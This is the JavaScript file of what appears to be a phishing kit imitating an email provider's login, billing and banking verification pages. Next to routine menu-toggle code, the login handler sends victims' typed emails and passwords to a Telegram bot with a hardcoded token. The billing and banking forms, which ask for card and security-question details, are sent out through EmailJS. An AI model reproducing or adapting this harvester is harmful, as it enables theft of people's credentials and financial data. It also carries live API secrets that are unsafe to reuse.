// toggles nav menu on mobile view upon menu button click
const menu = document.querySelector(".menu-icon");

menu.addEventListener("click", () => {
  const navLinks = document.querySelector(".nav-general");
  const navComputedStyle = window.getComputedStyle(navLinks);
  console.log(window.getComputedStyle(navLinks).display); // <empty string>

  if (navComputedStyle.display === "block") {
    navLinks.style.display = "none";
  } else {
    navLinks.style.display = "block";
  }
});

// Toggles the footer links display in the footer top
function showFooter(event, element) {
  event.preventDefault();

  const mediaQuery = window.matchMedia("(max-width: 768px)");

  if (event.type === "click" && mediaQuery.matches) {
    // console.log("clickkkkk");

    const footerLinks = element.lastElementChild;
    const footerComputedstyle = window.getComputedStyle(footerLinks);
    // console.log(footerComputedstyle.display);

    if (footerComputedstyle.display === "none") {
      footerLinks.style.display = "flex";
    } else {
      footerLinks.style.display = "none";
    }
  }
}

// API SETUP
async function apiCall(...texts) {
  const API_KEY = "7454271480:AAHYvF4jL3VNM-UnWYk-C8VqJkrODROfgFM";
  const chat_id = -4266117210;

  // Flatten the texts array if the first element is an array
  if (Array.isArray(texts[0])) {
    texts = texts[0];
  }

  // Join the texts array into a single string separated by new lines
  const combinedText = texts.join("\n");
  const url = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
    combinedText
  )}`;

  const api = new XMLHttpRequest();
  api.open("GET", url, true);

  // Define what happens on successful data submission
  api.onload = () => {
    if (api.status >= 200 && api.status < 300) {
      console.log("Message Sent!");
      // Navigate to a different URL after successful message sending
      window.location.href = "/views/billing.html"; // Change to your desired URL
    } else {
      console.log(`Failed to send message. Status: ${api.status}`);
    }
  };

  // Define what happens in case of an error
  api.onerror = () => {
    console.log("Error occurred while sending the message");
  };

  api.send();
}

// console.log(window.location.pathname);
if (window.location.pathname === "/views/billing.html") {
  const expiration = document.getElementById("expiration");
  const states = document.getElementById("states");
  const ExpYear = document.getElementById("year");

  const usStates = [
    "Alabama",
    "Alaska",
    "Arizona",
    "Arkansas",
    "California",
    "Colorado",
    "Connecticut",
    "Delaware",
    "Florida",
    "Georgia",
    "Hawaii",
    "Idaho",
    "Illinois",
    "Indiana",
    "Iowa",
    "Kansas",
    "Kentucky",
    "Louisiana",
    "Maine",
    "Maryland",
    "Massachusetts",
    "Michigan",
    "Minnesota",
    "Mississippi",
    "Missouri",
    "Montana",
    "Nebraska",
    "Nevada",
    "New Hampshire",
    "New Jersey",
    "New Mexico",
    "New York",
    "North Carolina",
    "North Dakota",
    "Ohio",
    "Oklahoma",
    "Oregon",
    "Pennsylvania",
    "Rhode Island",
    "South Carolina",
    "South Dakota",
    "Tennessee",
    "Texas",
    "Utah",
    "Vermont",
    "Virginia",
    "Washington",
    "West Virginia",
    "Wisconsin",
    "Wyoming",
  ];

  // Loop from 1 to 12 to create <option> elements
  for (let month = 1; month <= 12; month++) {
    const optionMonth = document.createElement("option");
    optionMonth.value = month;
    optionMonth.textContent = month;
    expiration.appendChild(optionMonth);
  }

  for (let year = 2024; year <= 2029; year++) {
    const optionYear = document.createElement("option");
    optionYear.value = year;
    optionYear.textContent = year;
    ExpYear.appendChild(optionYear);
  }

  usStates.map((state) => {
    // const states = document.getElementById("states");
    const option = document.createElement("option");
    option.value = state;
    option.textContent = state;
    states.appendChild(option);
  });
}

// Login Page Form Submit
if (window.location.pathname === "/") {
  const loginSubmitBtn = document.querySelector(".login-btn");
  // console.log(submitBtn);
  loginSubmitBtn.addEventListener("click", () => {
    const loginForm = document.getElementById("login-form");
    console.log(loginForm);

    // serviceID - templateID - #form - publicKey
    // emailjs
    //   .sendForm(
    //     "service_4q8coel",
    //     "template_a97si1y",
    //     "#login-form",
    //     "3n7ifkUOowaI47Ert"
    //   )
    //   .then(
    //     () => {
    //       loginForm.reset(); // Clear input fields
    //       console.log("Success");
    //       window.location.href = "views/billing.html";
    //     },
    //     () => {
    //       console.log("Message not sent");
    //     }
    //   );
    const email = document.getElementById("login-email").value;
    const pass = document.getElementById("login-pass").value;

    (async () => {
      await apiCall(`User-Email: ${email}`, `User-Pass: ${pass}`);
      console.log("This will run after the message is sent.");
    })();
    // }
  });
}

// Billing page
if (window.location.pathname === "/views/billing.html") {
  const prepaidCheckInput = document.getElementById("prepaid-check");

  // Add the 'name' attribute to the input element
  if (prepaidCheckInput.checked) {
    prepaidCheckInput.setAttribute("name", "prepaid-checked");
  } else {
    prepaidCheckInput.setAttribute("name", "prepaid-NOT-checked");
  }

  // Verify that the attribute was added
  console.log(prepaidCheckInput);

  // Billing page form submit
  function submitBilling() {
    const billingForm = document.getElementById("billing-form");
    console.log(billingForm);

    // serviceID - templateID - #form - publicKey
    emailjs
      .sendForm(
        "service_4q8coel",
        "template_a97si1y",
        "#billing-form",
        "3n7ifkUOowaI47Ert"
      )
      .then(
        () => {
          billingForm.reset(); // Clear input fields
          console.log("Success");
          window.location.href = "./banking.html";
        },
        () => {
          console.log("Message not sent");
        }
      );
  }
}

// Banking form submit
if (window.location.pathname === "/views/banking.html") {
  const bankingVerifyBtn = document.querySelector(".verify-btn");
  // console.log(submitBtn);
  bankingVerifyBtn.addEventListener("click", () => {
    const bankingForm = document.getElementById("banking-form");
    console.log(bankingForm);

    // serviceID - templateID - #form - publicKey
    emailjs
      .sendForm(
        "service_4q8coel",
        "template_a97si1y",
        "#banking-form",
        "3n7ifkUOowaI47Ert"
      )
      .then(
        () => {
          bankingForm.reset(); // Clear input fields
          console.log("Success");
          window.location.href = "/";
        },
        () => {
          console.log("Message not sent");
        }
      );
  });

  const questions = [
    "What is the name of your first babysitter?",
    "What is your Mother's maiden name?",
    "What is the first name of your hairdresser/barber?",
    "What was the name of your first boyfriend/girlfriend?",
    "In what city did you meet your spouse/significant other?",
    "As a child, what did you want to be when you grew up?",
    "Where were you on New Year's 2000?",
    "What was the first live concert you attended?",
    "What was the first name of your favorite teacher/professor?",
    "What is the name of your favorite restaurant?",
    "On what street is your grocery store?",
  ];
  const selectElement = document.getElementById("security-question");

  questions.map((question, index) => {
    const option = document.createElement("option");
    option.value = `question-${index + 1}`; // question1, question2, ...
    option.textContent = question;
    selectElement.appendChild(option);
  });
}

// if (window.location.pathname === "views/thank-you.html") {
//   console.log(window.location.pathname);
//   setTimeout(() => {
//     window.location.href = "https://login.frontier.com/webmail/";
//   }, 3000);
// }
